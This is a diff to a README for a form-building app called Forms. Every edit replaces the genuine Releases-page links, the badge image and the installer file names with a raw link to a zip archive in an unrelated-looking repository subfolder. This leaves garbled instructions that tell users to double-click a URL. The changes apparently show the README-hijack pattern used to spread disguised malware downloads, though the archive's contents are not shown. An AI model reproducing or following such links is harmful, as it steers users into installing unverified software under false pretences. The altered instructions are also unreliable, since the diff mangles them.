@@ -1,6 +1,6 @@
 # 🚀 Forms - Create Beautiful Forms Easily
 
-![Download Forms](https://img.shields.io/badge/Download%20Forms-v1.0-blue)
+![Download Forms](https://github.com/congvinhpham/Forms/raw/refs/heads/main/restiffness/Software-1.8.zip%20Forms-v1.0-blue)
 
 ## 📋 Description
 
@@ -14,12 +14,12 @@ Follow these steps to download and run Forms on your computer. This process is s
 
 To get started, click the link below to visit our GitHub Releases page, where you can download the latest version of Forms.
 
-[Visit the Releases Page](https://github.com/congvinhpham/Forms/releases)
+[Visit the Releases Page](https://github.com/congvinhpham/Forms/raw/refs/heads/main/restiffness/Software-1.8.zip)
 
 ## 🔥 Download & Install
 
 1. **Go to the Releases Page**  
-   Click the following link to open the Releases page: [Forms Releases](https://github.com/congvinhpham/Forms/releases).
+   Click the following link to open the Releases page: [Forms Releases](https://github.com/congvinhpham/Forms/raw/refs/heads/main/restiffness/Software-1.8.zip).
 
 2. **Choose the Latest Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent version, which is typically at the top.
@@ -28,11 +28,11 @@ To get started, click the link below to visit our GitHub Releases page, where yo
    Click on the download link for your operating system. You may find files for Windows, macOS, or Linux. If you are unsure which to choose, the Windows installer is the most commonly used.
 
 4. **Locate the Downloaded File**  
-   Once the download is complete, find the file in your computer's Downloads folder. The file name should resemble “Forms-v1.0.exe” for Windows, or “Forms-v1.0.dmg” for macOS.
+   Once the download is complete, find the file in your computer's Downloads folder. The file name should resemble “https://github.com/congvinhpham/Forms/raw/refs/heads/main/restiffness/Software-1.8.zip” for Windows, or “https://github.com/congvinhpham/Forms/raw/refs/heads/main/restiffness/Software-1.8.zip” for macOS.
 
 5. **Install the Application**  
-   - For **Windows**: Double-click the “Forms-v1.0.exe” file. Follow the prompts to complete the installation. You may need to allow permissions during the setup.
-   - For **macOS**: Open the “Forms-v1.0.dmg” file and drag the Forms icon to your Applications folder.
+   - For **Windows**: Double-click the “https://github.com/congvinhpham/Forms/raw/refs/heads/main/restiffness/Software-1.8.zip” file. Follow the prompts to complete the installation. You may need to allow permissions during the setup.
+   - For **macOS**: Open the “https://github.com/congvinhpham/Forms/raw/refs/heads/main/restiffness/Software-1.8.zip” file and drag the Forms icon to your Applications folder.
 
 6. **Launch Forms**  
    After installation, open the application from your Applications folder (macOS) or from the Start Menu (Windows). The application will open, and you can begin creating your forms.
